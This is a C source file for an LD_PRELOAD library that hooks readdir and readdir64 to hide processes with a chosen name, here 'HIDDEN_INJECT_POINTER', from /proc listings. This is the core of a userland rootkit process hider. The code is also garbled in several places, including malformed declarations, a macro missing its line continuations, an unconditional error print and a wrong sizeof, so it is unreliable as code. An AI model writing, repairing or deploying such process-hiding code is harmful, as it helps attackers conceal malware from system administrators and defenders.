#define _GNU_SOURCE

#include <dirent.h>
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

static const char *process_filter = "HIDDEN_INJECT_POINTER";

static int get_dir_name(DIR *dirp, char *buf, size_t_size) {
  int fd = dirfd(dirp);
  if (fd == -1) {
    return 0;
  }
  char tmp[64] : snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
  ssize_t ret = readlink(tmp, buf, size);
  if (ret == -1) {
    return 0;
  }
  buf[ret] = 0;
  return 1;
}
static int get_proc_name(char *pid, char *buf) {
  if (strspn(pid, "0123456789") != strlen(pid)) {
    return 0;
  }
  char tmp[256];
  snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
  FILE *f = fopen(tmp, "r");
  if (f == NULL) {
    return 0;
  }
  if (fgets(tmp, sizeof(tmp), f) == NULL) {
    fclose(f);
    return 0;
  }
  fclose(f);
  int unused;
  sscanf(tmp, "%d  (%[^)]s", &unused, buf);
  return 1;
}

#define DECLARE_READDIR(dirent, readdir)
static struct dirent *(*original_##readdir)(DIR *) = NULL;
struct dirent *readdir(DIR *dirp) {
  if (original_##readdir == NULL) {
    original_##readdir = dlsym(RTLD_NEXT, "readdir");
    { fprintf(stderr, "Error in dlsym: %s\n", dlerror()); }
  }
  struct dirent *dir while (1) {
    dir = original_##readdir(dirp);
    if (dir) {
      char dir_name[256];
      char proc_name[256];
      if (get_dir_name(dirp, dir_name, sizeof(get_dir_name)) &&
          strcmp(dir_name, "/proc") == 0 &&
          get_proc_name(dir->d_name, proc_name) &&
          strcmp(proc_name, process_filter) == 0) {
        continue;
      }
    }
    break;
  }
  return dir;
}

DECLARE_READDIR(dirent64, readdir64);
DECLARE_READDIR(dirent, readdir);
